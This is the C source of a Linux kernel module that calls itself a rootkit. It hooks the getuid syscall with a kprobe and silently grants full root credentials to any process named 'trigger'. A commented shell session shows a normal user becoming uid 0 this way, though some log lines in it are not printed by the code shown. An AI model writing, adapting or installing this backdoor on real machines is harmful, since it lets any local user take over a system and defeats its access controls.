#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>
#include <linux/kprobes.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Victor");
MODULE_DESCRIPTION("Hook getuid syscall to give root privileges using Kprobes");
MODULE_VERSION("0.01");

static struct kprobe kp;
void set_root(void);

static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    const char *target_cmd = "trigger";  // Nom de la commande a trigger pour activer la privesc
    char comm[TASK_COMM_LEN]; // Nom du processus actuel

    // Récupérer le nom du processus actuel
    get_task_comm(comm, current);

    // Vérifier si la commande correspond à la cible
    if (strcmp(comm, target_cmd) == 0) {
        printk(KERN_INFO "rootkit: Granting root privileges for process %s...\n", comm);
        set_root();
    }

    return 0;
}



static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
{
    // Si le syscall a réussi, on met le registre ax à 0
    if (regs->si == 0) {
        regs->ax = 0;  // Indique succès pour le syscall
    }
}


void set_root(void)
{
    struct cred *root;
    root = prepare_creds();
    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

static int __init rootkit_init(void)
{
    int ret;
    kp.symbol_name = "__x64_sys_getuid";
    kp.pre_handler = handler_pre;
    kp.post_handler = handler_post;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        printk(KERN_ERR "rootkit: Failed to register kprobe, returned %d\n", ret);
        return ret;
    }

    printk(KERN_INFO "rootkit: Kprobe registered at %s\n", kp.symbol_name);
    return 0;
}

static void __exit rootkit_exit(void)
{
    unregister_kprobe(&kp);
    printk(KERN_INFO "rootkit: Kprobe unregistered\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);


/*

(none):~# echo "#!/bin/bash" > /usr/bin/trigger
(none):~# echo "id" >> /usr/bin/trigger
(none):~# chmod +x /usr/bin/trigger
(none):~# insmod getuid.ko 
[ 1256.021602] rootkit: Kprobe registered at __x64_sys_getuid
(none):~# su feur
[ 1257.587381] rootkit: getuid called by process su
[ 1257.588579] rootkit: getuid called by process su
[ 1257.599878] rootkit: getuid called by process sh
/root $ id
[ 1259.110862] rootkit: getuid called by process id
[ 1259.111222] rootkit: getuid called by process id
uid=1000(feur) gid=1000(feur) groups=10(wheel),1000(feur)
/root $ trigger
[ 1261.506248] rootkit: getuid called by process trigger
[ 1261.506368] rootkit: Granting root privileges for process trigger...
[ 1261.525060] rootkit: getuid called by process id
[ 1261.526145] rootkit: getuid called by process id
uid=0(root) gid=0(root) groups=10(wheel),1000(feur)
/root $ 

 */